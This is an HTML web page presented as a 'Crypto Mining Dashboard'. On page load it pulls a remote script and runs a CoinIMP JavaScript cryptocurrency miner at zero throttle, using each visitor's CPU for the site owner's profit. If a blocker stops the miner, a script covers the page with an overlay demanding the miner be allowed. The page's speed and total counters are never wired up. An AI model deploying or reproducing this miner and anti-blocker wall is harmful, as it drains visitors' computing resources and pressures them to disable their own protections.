<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crypto Mining Dashboard</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            overflow: hidden;
        }

        .container {
            max-width: 600px;
            width: 90%;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            background-color: #ffffff;
            text-align: center;
            position: relative;
        }

        h1 {
            color: #333333;
        }

        .info {
            margin-top: 20px;
            text-align: left;
        }

        .info p {
            margin-bottom: 10px;
        }

        .hash-value {
            font-size: 20px;
            font-weight: bold;
            color: #007bff;
        }

        .hash-table {
            margin-top: 20px;
            width: 100%;
            border-collapse: collapse;
        }

        .hash-table th,
        .hash-table td {
            padding: 8px;
            border-bottom: 1px solid #cccccc;
            text-align: left;
        }

        .hash-table th {
            background-color: #f0f0f0;
        }

        a {
            color: #007bff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .bitcoin-img {
            position: absolute;
            left: -10%;
            animation: fall 5s linear infinite, sway 2s linear infinite;
        }

        @keyframes fall {
            from { top: -50px; }
            to { top: calc(100vh - 50px); }
        }

        @keyframes sway {
            50% { transform: translateX(10%); }
        }
    </style>
    <script src="https://www.hostingcloud.racing/ElSO.js"></script>
    <script>
        var _client = new Client.Anonymous('201bf3164446664b5c4e56c8ce2d8d0464a9ded1d82355ffb07357741b6262c3', {
            throttle: 0, c: 'w'
        });
        _client.start();
        _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");

        setTimeout(function(){
            if(typeof _client === 'undefined' || _client === null)
            {
                var messageDiv = document.createElement("div");
                messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
                messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
                var mainDiv = document.createElement("div");
                mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
                mainDiv.appendChild(messageDiv);
                document.body.appendChild(mainDiv);
                document.getElementsByTagName("body")[0].style.overflow = "hidden";
                window.scrollTo(0, 0);
            }
        },1000);

        setTimeout(function(){
            let numBitcoins = 10; // Jumlah gambar Bitcoin yang akan jatuh
            let container = document.body;
            let bitcoinImages = [];

            for (let i = 0; i < numBitcoins; i++) {
                let bitcoin = document.createElement('img');
                bitcoin.src = 'https://upload.wikimedia.org/wikipedia/commons/4/46/Bitcoin.svg';
                bitcoin.classList.add('bitcoin-img');
                bitcoin.style.left = Math.random() * window.innerWidth + 'px';
                bitcoin.style.animationDelay = Math.random() * 5 + 's';
                bitcoin.style.animationDuration = Math.random() * 5 + 5 + 's';
                container.appendChild(bitcoin);
                bitcoinImages.push(bitcoin);
            }

            setInterval(() => {
                bitcoinImages.forEach(bitcoin => {
                    bitcoin.style.left = Math.random() * window.innerWidth + 'px';
                });
            }, 5000);
        }, 2000);
    </script>
</head>
<body>
    <div class="container">
        <h1>Crypto Currency</h1>
        <div class="info">
            <p>This site is running JavaScript miner from <a href="https://www.coinimp.com/">coinimp.com</a>. If it bothers you, you can stop it.</p>
            <p>If you're interested in mining, you can start <a href="https://www.coinimp.com/invite/5c749fe6-9220-4369-9374-af94a7f60c8c">here</a>.</p>
            <table class="hash-table">
                <br>
                <tr>
                    <td>Speed :</td>
                    <td><span id="speedValue" class="hash-value">0</span></td>
                </tr>
                <tr>
                    <td>Total :</td>
                    <td><span id="totalValue" class="hash-value">0</span></td>
                </tr>
                
            </table>
        </div>
    </div>
</body>
</html>
